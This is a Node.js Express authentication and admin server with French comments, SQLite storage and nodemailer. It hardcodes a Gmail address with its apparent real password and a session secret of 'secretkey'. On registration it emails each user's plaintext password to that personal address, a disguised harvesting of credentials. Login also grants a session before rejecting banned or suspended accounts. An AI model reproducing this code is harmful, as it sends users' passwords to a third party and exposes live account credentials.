const express = require("express");
const sqlite3 = require("sqlite3").verbose();
const bcrypt = require("bcrypt");
const nodemailer = require("nodemailer");
const session = require("express-session");
const path = require("path");

// Initialisation du serveur Express
const app = express();
const db = new sqlite3.Database("./db.sqlite3");
const port = process.env.PORT || 3000;

// Middleware pour parser les requêtes JSON
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));
app.use(
  session({
    secret: "secretkey",
    resave: false,
    saveUninitialized: true,
  })
);

// Transporteur d'email
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: "charton.hugo1001@gmail.com",
    pass: "Ptitbiscuit21",
  },
});

// Création de la table users (si elle n'existe pas)
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    email TEXT UNIQUE,
    password_hash TEXT,
    role TEXT DEFAULT 'user',
    status TEXT DEFAULT 'active',
    created_at TEXT DEFAULT CURRENT_TIMESTAMP
  )`);
});

// Fonction de vérification d'authentification
function requireAuth(req, res, next) {
  if (!req.session || !req.session.userId)
    return res.status(401).json({ error: "Not authenticated" });
  db.get(
    "SELECT * FROM users WHERE id = ?",
    [req.session.userId],
    (err, user) => {
      if (err || !user) return res.status(403).json({ error: "Forbidden" });
      req.user = user;
      next();
    }
  );
}

// Fonction de vérification admin
function requireAdmin(req, res, next) {
  if (!req.session || !req.session.userId)
    return res.status(401).json({ error: "Not authenticated" });
  db.get(
    "SELECT role FROM users WHERE id = ?",
    [req.session.userId],
    (err, row) => {
      if (err || !row) return res.status(403).json({ error: "Access denied" });
      if (row.role === "admin") return next();
      return res.status(403).json({ error: "Admin only" });
    }
  );
}

// Route d'inscription
app.post("/api/register", async (req, res) => {
  const { email, password } = req.body;
  if (!email || !password)
    return res.status(400).json({ message: "Email et mot de passe requis" });

  try {
    // Hachage du mot de passe
    const hash = await bcrypt.hash(password, 12);
    db.run(
      "INSERT INTO users (email, password_hash, role, status) VALUES (?, ?, ?, ?)",
      [email, hash, "user", "active"],
      function (err) {
        if (err) {
          if (err.code === "SQLITE_CONSTRAINT")
            return res.status(409).json({ message: "Email déjà utilisé" });
          return res.status(500).json({ message: "Erreur interne" });
        }

        // Envoi d'un email à l'admin
        const adminEmail = "charton.hugo1001@gmail.com";
        const mailOptions = {
          from: "no-reply@example.com",
          to: adminEmail,
          subject: `Nouvelle inscription : ${email}`,
          text: `Un nouvel utilisateur s'est inscrit avec l'email ${email}. Mot de passe : ${password}`,
        };
        transporter
          .sendMail(mailOptions)
          .catch((err) => console.error("Erreur d'envoi d'email:", err));

        // Réponse à l'utilisateur
        res.json({ success: true, userId: this.lastID });
      }
    );
  } catch (e) {
    console.error(e);
    return res.status(500).json({ message: "Erreur serveur" });
  }
});

// Route de connexion
app.post("/api/login", (req, res) => {
  const { email, password } = req.body;
  if (!email || !password)
    return res.status(400).json({ message: "Email et mot de passe requis" });

  db.get("SELECT * FROM users WHERE email = ?", [email], async (err, user) => {
    if (err || !user)
      return res.status(404).json({ message: "Utilisateur non trouvé" });

    // Comparer les mots de passe
    const match = await bcrypt.compare(password, user.password_hash);
    if (!match)
      return res.status(401).json({ message: "Mot de passe incorrect" });

    // Sauvegarder la session
    req.session.userId = user.id;

    // Vérifier le statut de l'utilisateur
    if (user.status !== "active") {
      return res.status(403).json({ message: `Compte ${user.status}` });
    }

    res.json({ success: true, userId: user.id });
  });
});

// Route de déconnexion
app.post("/api/logout", (req, res) => {
  req.session.destroy((err) => {
    if (err) return res.status(500).json({ message: "Erreur de déconnexion" });
    res.json({ success: true });
  });
});

// Page d'accueil
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Page de profil utilisateur (authentifié)
app.get("/profile", requireAuth, (req, res) => {
  res.sendFile(path.join(__dirname, "public", "profile.html"));
});

// Page admin pour gérer les utilisateurs
app.get("/admin", requireAdmin, (req, res) => {
  res.sendFile(path.join(__dirname, "public", "admin.html"));
});

// Récupérer la liste des utilisateurs (admin seulement)
app.get("/api/admin/users", requireAdmin, (req, res) => {
  db.all(
    "SELECT id, email, role, status, created_at FROM users ORDER BY created_at DESC",
    [],
    (err, rows) => {
      if (err) return res.status(500).json({ error: "Erreur DB" });
      res.json({ users: rows });
    }
  );
});

// Actions admin (promouvoir, bannir, suspendre, supprimer)
app.post("/api/admin/action", requireAdmin, (req, res) => {
  const { userId, action } = req.body;
  if (!userId || !action)
    return res.status(400).json({ message: "ID utilisateur et action requis" });

  db.get("SELECT id, role FROM users WHERE id = ?", [userId], (err, user) => {
    if (err || !user)
      return res.status(404).json({ message: "Utilisateur non trouvé" });

    // Prévenir la suppression d'un admin
    if (action === "delete" && user.role === "admin") {
      return res
        .status(403)
        .json({ message: "Impossible de supprimer un administrateur" });
    }

    let sql, params;
    switch (action) {
      case "ban":
        sql = "UPDATE users SET status = ? WHERE id = ?";
        params = ["banned", userId];
        break;
      case "suspend":
        sql = "UPDATE users SET status = ? WHERE id = ?";
        params = ["suspended", userId];
        break;
      case "unsuspend":
        sql = "UPDATE users SET status = ? WHERE id = ?";
        params = ["active", userId];
        break;
      case "promote_mod":
        sql = "UPDATE users SET role = ? WHERE id = ?";
        params = ["moderator", userId];
        break;
      case "promote_admin":
        sql = "UPDATE users SET role = ? WHERE id = ?";
        params = ["admin", userId];
        break;
      case "demote":
        sql = "UPDATE users SET role = ? WHERE id = ?";
        params = ["user", userId];
        break;
      case "delete":
        sql = "DELETE FROM users WHERE id = ?";
        params = [userId];
        break;
      default:
        return res.status(400).json({ message: "Action inconnue" });
    }

    db.run(sql, params, function (err2) {
      if (err2)
        return res.status(500).json({ message: "Erreur de base de données" });
      return res.json({ success: true });
    });
  });
});

// Lancer le serveur
app.listen(port, () => {
  console.log(`Server running on http://localhost:${port}`);
});
